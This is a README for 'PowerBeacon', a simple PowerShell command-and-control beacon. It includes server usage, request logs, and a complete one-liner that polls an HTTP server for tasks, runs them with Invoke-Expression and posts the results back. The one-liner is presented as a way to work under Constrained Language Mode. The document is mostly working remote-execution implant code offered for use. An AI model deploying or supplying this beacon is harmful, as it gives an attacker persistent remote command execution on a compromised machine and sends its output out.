# PowerBeacon
This is simple script of reading and execute command from a http in PowerShell.

# Usage
## Server
```
$ cat tasks
echo test
whoami

$ python3 server.py -i 127.0.0.1 -p 8888 
Serving HTTP on :: port 8888 ...

# Client accesss and execute the contents of /tasks. The result is forwarded to the server.
127.0.0.1 - - [20/Aug/2024 00:00:10] "GET /tasks.txt HTTP/1.1" 200 -
127.0.0.1 - - [20/Aug/2024 00:00:10] "POST / HTTP/1.1" 200 -
test
MyPC\User
```

## Client
```
PS > beacon_http.ps1 <Server IP address:port> <Polling interval>
```

If you want to run in CLM(Constratined Langage Mode), use 'beacon_oneliner.ps1'
```
PS > while ($true) {$url="http://127.0.0.1:8888";$response = Invoke-WebRequest -Uri $($url + "/tasks.txt");$results = Invoke-Expression $response.Content;Invoke-WebRequest -Method Post -Uri $url -Body $($results -join "`n") -ContentType "application/text" > $null ;Start-Sleep -Seconds 10}
```